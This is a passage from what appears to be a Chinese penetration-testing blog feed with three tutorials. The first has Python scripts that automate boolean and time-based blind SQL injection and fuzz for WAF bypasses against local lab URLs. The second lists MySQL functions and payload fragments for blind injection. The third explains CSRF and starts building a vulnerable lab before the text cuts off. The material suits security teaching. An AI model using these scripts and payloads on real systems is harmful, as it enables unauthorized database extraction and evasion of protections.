    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。</p><h2 id="0x01-布尔型盲注"><a href="#0x01-布尔型盲注" class="headerlink" title="0x01 布尔型盲注"></a>0x01 布尔型盲注</h2><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#! -*- encoding:utf-8 -*-</span><br><span class="hljs-meta"># python3</span><br><span class="hljs-meta"># author: leticia</span><br>import requests<br><span class="hljs-meta">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="hljs-meta">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="hljs-meta">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &#x27;xxx&#x27;</span><br><span class="hljs-meta">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &#x27;xxx&#x27; and TABLE_NAME = &#x27;xxx&#x27;</span><br>dic=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz,&#x27;</span><br>url=<span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-8/?id=1\&#x27; and &#x27;</span><br><span class="hljs-keyword">string</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j in dic:<br>        id=<span class="hljs-string">&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;</span>.format(str(i),ascii(j))<br>        #print(id)<br>        url_get=(url+id)<br>        #print(url_get)<br>        r=requests.<span class="hljs-keyword">get</span>(url_get)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> in r.text:<br>            <span class="hljs-keyword">string</span>+=j<br>            print(<span class="hljs-keyword">string</span>)<br>print(<span class="hljs-keyword">string</span>)<br></code></pre></td></tr></table></figure><p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面正常即存在user关键字（根据实际情况更改），就将这个字母保存在string中，遍历完之后输出string。</p><h2 id="0x02-基于时间的盲注"><a href="#0x02-基于时间的盲注" class="headerlink" title="0x02 基于时间的盲注"></a>0x02 基于时间的盲注</h2><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#! -*- encoding:utf-8 -*-</span><br><span class="hljs-meta"># python3</span><br><span class="hljs-meta"># author: leticia</span><br><br>import requests<br><span class="hljs-meta">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="hljs-meta">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="hljs-meta">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &#x27;xxx&#x27;</span><br><span class="hljs-meta">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &#x27;xxx&#x27; and TABLE_NAME = &#x27;xxx&#x27;</span><br>dic=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz,&#x27;</span><br>url=<span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-8/?id=1\&#x27; and &#x27;</span><br><span class="hljs-keyword">string</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j in dic:<br>        id=<span class="hljs-string">&quot;if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0)--+&quot;</span>.format(str(i),ascii(j))<br>        #print(id)<br>        url_get=(url+id)<br>        #print(url_get)<br>        r=requests.<span class="hljs-keyword">get</span>(url_get)<br>        sec=r.elapsed.seconds<br>        <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">string</span>+=j<br>            print(<span class="hljs-keyword">string</span>)<br>            <span class="hljs-keyword">break</span><br>print(<span class="hljs-keyword">string</span>)<br></code></pre></td></tr></table></figure><p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面需要两秒以上才能返回（即触发sleep(3)函数），就将这个字母保存在string中，遍历完之后输出string。</p><h2 id="0x03-fuzz测试"><a href="#0x03-fuzz测试" class="headerlink" title="0x03 fuzz测试"></a>0x03 fuzz测试</h2><p>在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。在某些有安全狗一类的防护系统下，如果要手工判断过滤规则需要安全工作者很高的执行力，在这些情况下fuzz测试可以充分利用机器生成无规则且大量的数据来进行测试，拥有很高的效率。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! -*- encoding:utf-8 -*-</span><br><span class="hljs-comment"># python3</span><br><br>import requests<br><br>fuzz_zs = [<span class="hljs-string">&#x27;/*&#x27;</span>, <span class="hljs-string">&#x27;*/&#x27;</span>, <span class="hljs-string">&#x27;/*!&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;%00&#x27;</span>]<br>fuzz_sz = [<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>]<br>fuzz_ch = [<span class="hljs-string">&quot;%0a&quot;</span>, <span class="hljs-string">&quot;%0b&quot;</span>, <span class="hljs-string">&quot;%0c&quot;</span>, <span class="hljs-string">&quot;%0d&quot;</span>, <span class="hljs-string">&quot;%0e&quot;</span>, <span class="hljs-string">&quot;%0f&quot;</span>, <span class="hljs-string">&quot;%0g&quot;</span>, <span class="hljs-string">&quot;%0h&quot;</span>, <span class="hljs-string">&quot;%0i&quot;</span>, <span class="hljs-string">&quot;%0j&quot;</span>]<br><br>fuzz = fuzz_zs + fuzz_sz + fuzz_ch<br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0&quot;</span>,<br>    <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>&#125;<br>url_start = <span class="hljs-string">&quot;http://127.0.0.1/waf/test.php?id=1&quot;</span><br>test_url=requests.get(url_start,headers=headers)<br><span class="hljs-keyword">print</span>(test_url.text)<br><br><span class="hljs-keyword">for</span> a in fuzz:<br>    <span class="hljs-keyword">for</span> b in fuzz:<br>        <span class="hljs-keyword">for</span> c in fuzz:<br>            <span class="hljs-keyword">for</span> d in fuzz:<br>                <span class="hljs-keyword">exp</span> = <span class="hljs-string">&quot;/*!union&quot;</span> + a + b + c + d + <span class="hljs-string">&quot;select*/ 1,2,3&quot;</span><br>                url = url_start + <span class="hljs-keyword">exp</span><br>                res = requests.get(url=url, headers=headers)<br>                <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Now URL:&quot;</span> + url)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;user&quot;</span> in res.text:<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Find Fuzz bypass:&quot;</span> + url)<br>                    with <span class="hljs-keyword">open</span>(r<span class="hljs-string">&quot;C:\Users\Leticia\Desktop\results.txt&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as r:<br>                        r.write(url + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里将fuzz常用到的内联注释、特殊字符等，随机组合，循环添加到union select之间，如果返回的页面正常显示user，没有进入防护系统的拦截界面，说明这里的表达式没有被过滤，然后写到results.txt中保存。</p><p>之后我们可以利用results.txt分析到的规则，再完善前面的其他脚本，进行自动化注入。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>做测试时不能总是依赖sqlmap等完全自动化工具，也不能完全依赖手注，根据面对的实际情况编写适当的脚本，才能更熟练的掌握这些漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>python</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入盲注时常用函数</title>
    <link href="/2018/04/21/sql%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E6%97%B6%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2018/04/21/sql%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E6%97%B6%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-盲注"><a href="#0x00-盲注" class="headerlink" title="0x00 盲注"></a>0x00 盲注</h2><p>盲注是不能通过直接显示的途径来获取数据库数据的方法，在盲注中，攻击者根据其返回页面的不同来判断信息。盲注一般可分为三类：Booleanbase<br>、Timebase、Errorbase。</p><p>接下来介绍一些sql盲注中常用的函数。</p><h2 id="0x01-limit"><a href="#0x01-limit" class="headerlink" title="0x01 limit()"></a>0x01 limit()</h2><p>limit()函数的作用是限制由SELECT语句返回的数据数量，用法是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> column1, column2, columnN <br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> [<span class="hljs-keyword">no</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">rows</span>]<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>;   //从第三行开始提取一行<br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>column : 必要参数，要查询的字段名，可以同时查询多个。</li><li>table_name : 必要参数，要查询的表名。</li><li>no of rows : limit之后的第一个数字代表行数（从0开始算）后面数字代表从这行要返回的行数。</li></ul><p>和offset同时用时用法如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> column1, column2, columnN <br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> [<span class="hljs-keyword">no</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">rows</span>] <span class="hljs-keyword">OFFSET</span> [<span class="hljs-keyword">row</span> num]<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>   //从第三行开始提取一行<br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>no of rows : 取到的行数。</li><li>row num : 起始位置（从0开始算）</li></ul><h2 id="0x02-mid"><a href="#0x02-mid" class="headerlink" title="0x02 mid()"></a>0x02 mid()</h2><p>mid()函数的作用是截取字符串的一部分，用法是</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">mid</span>(column_name,<span class="hljs-built_in">start</span>[,<span class="hljs-built_in">length</span>])<br></code></pre></td></tr></table></figure><p>其中各参数的意义如下：</p><ul><li>column_name ： 必要参数，要提取字符的字段。</li><li>start : 必要参数，规定提取的起始位置，从1开始。</li><li>length : 可选参数，要返回的字符长度，如果省略会返回剩余的全部文本。</li></ul><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>返回数据库名的第一位。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><p>返回数据库名的第一位并与a的ascii作比较。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=<span class="hljs-number">0</span>x<span class="hljs-number">76657374</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>查找test数据库的第一个表名并提取表名的第一位。</p><h2 id="0x03-substr-、substring"><a href="#0x03-substr-、substring" class="headerlink" title="0x03 substr()、substring()"></a>0x03 substr()、substring()</h2><p>substr()、substring()函数的作用也是截取字符串，用法同mid()</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">substring(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br>substr(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>string ： 必要参数，要提取字符的字段。</li><li>start : 必要参数，规定提取的起始位置，从1开始。</li><li>length : 可选参数，要返回的字符长度，如果省略会返回剩余的全部文本。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(DATABASE()</span></span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><p>返回数据库名的第二位并与a的ascii作比较。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> table_schema=<span class="hljs-number">0x76657374</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><p>查找test数据库的第一个表名并提取表名的第一位,然后有a的ascii作比较。</p><h2 id="0x04-left"><a href="#0x04-left" class="headerlink" title="0x04 left()"></a>0x04 left()</h2><p>left()函数的作用是得到字符串左部开始指定个数的字符。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>string ： 必要参数，要截取的字符串。</li><li>n : 必要参数，规定截取的长度，从1开始。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><p>查看数据库名的第一位并和a的ascii作比较。</p><h2 id="0x05-ord"><a href="#0x05-ord" class="headerlink" title="0x05 ord()"></a>0x05 ord()</h2><p>ord()函数的作用是返回字符串中第一个字符的ASCII值。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-variable">string</span>)</span><br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>string ： 必要参数，要获取的字符串。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ord</span>(mid(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span><br></code></pre></td></tr></table></figure><p>检测user()的第一个字符是否等于114，即是否等于r，一般用来判断是否是root权限。</p><h2 id="0x06-sleep"><a href="#0x06-sleep" class="headerlink" title="0x06 sleep()"></a>0x06 sleep()</h2><p>sleep()函数的作用是让代码执行延迟若干秒。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>seconds ： 必要参数，延迟的秒数。</li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></td></tr></table></figure><p>检测数据库的第一个字符的ascii和a比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小。</p><h2 id="0x07-benchmark"><a href="#0x07-benchmark" class="headerlink" title="0x07 benchmark()"></a>0x07 benchmark()</h2><p>benchmark()函数的作用是重复执行指令。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>count ： 必要参数，重复的次数。</li><li>expr : 必要参数，执行的语句。</li></ul><h2 id="0x08-grunp-concat"><a href="#0x08-grunp-concat" class="headerlink" title="0x08 grunp_concat()"></a>0x08 grunp_concat()</h2><p>grunp_concat()函数的作用是连接字段字符串。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">group_concat([<span class="hljs-keyword">DISTINCT</span>] <span class="hljs-type">name</span> [<span class="hljs-keyword">Order</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">ASC</span>/<span class="hljs-keyword">DESC</span> 排序字段] [Separator <span class="hljs-string">&#x27;分隔符&#x27;</span>])<br></code></pre></td></tr></table></figure><p>其中各参数意义如下：</p><ul><li>name : 要连接的字段</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">substr</span>((select group_concat(schema_name) from information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">105</span><br></code></pre></td></tr></table></figure><h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>盲注是sql注入中十分常用的手段，而且盲注很多时候需要写脚本来实现，熟悉这些函数，结合前面的绕过方法，会让自己的脚本更加灵活。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>mysql</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF跨站请求伪造</title>
    <link href="/2018/04/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2018/04/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-CSRF跨站请求伪造"><a href="#0x00-CSRF跨站请求伪造" class="headerlink" title="0x00 CSRF跨站请求伪造"></a>0x00 CSRF跨站请求伪造</h2><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行和难以防范，所以被认为比XSS更具危险性。</p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>用户登陆网站A，并且生成本地cookie，在没有退出的情况下点击了攻击者构造的危险链接进入了网站B，而网站B是个危险请求，用户以自己的身份发送了危险请求。</p><h2 id="0x02-CSRF攻击实例"><a href="#0x02-CSRF攻击实例" class="headerlink" title="0x02 CSRF攻击实例"></a>0x02 CSRF攻击实例</h2><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a>  可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> 。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory&quot;</span><br></code></pre></td></tr></table></figure><p>并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p><h2 id="0x03-CSRF环境搭建"><a href="#0x03-CSRF环境搭建" class="headerlink" title="0x03 CSRF环境搭建"></a>0x03 CSRF环境搭建</h2><p>首先我们写一个登陆之后能修改密码的系统，账号密码等信息存放在数据库中，数据库中假设有如下几个用户的信息：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/csrf/csrf01.png"></p><p>然后在wamp环境中www/csrf路径中创建：</p><ul><li>login.html</li><li>login.php</li><li>welcome.php</li><li>exit.php</li></ul><p>各部分代码如下</p><p>登陆界面login.html:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>登陆界面代码只有简单的一个表单提交账号密码给后台。</p><p>登陆后台login.php:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 